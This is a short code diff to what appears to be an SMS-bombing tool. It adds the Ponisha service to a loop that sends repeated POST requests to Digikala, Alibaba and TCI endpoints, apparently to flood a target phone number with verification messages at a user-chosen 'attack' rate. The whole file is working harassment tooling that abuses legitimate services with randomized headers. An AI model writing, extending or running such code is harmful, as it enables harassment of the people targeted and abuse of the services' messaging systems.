@@ -16,7 +16,7 @@ cyan = "\033[36m"
 purple = "\033[35m"
 #########################
 
-from date_call import number, heads, url_digikala, json_digikala, url_alibaba, json_alibaba, url_tci, json_tci
+from date_call import number, heads, url_digikala, json_digikala, url_alibaba, json_alibaba, url_tci, json_tci, url_ponisha, json_ponisha
 
 attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset))) 
 
@@ -53,8 +53,9 @@ while i < numbert:
     print(yellow + "3-Tci : " + str(req_tci))
     time.sleep(sleep_time)
 
-
-
+    req_ponisha = requests.post(url=url_ponisha,json=json_ponisha,headers=random_head)
+    print(yellow + "4-ponisha : " + str(req_ponisha))
+    time.sleep(sleep_time)
 
 
  
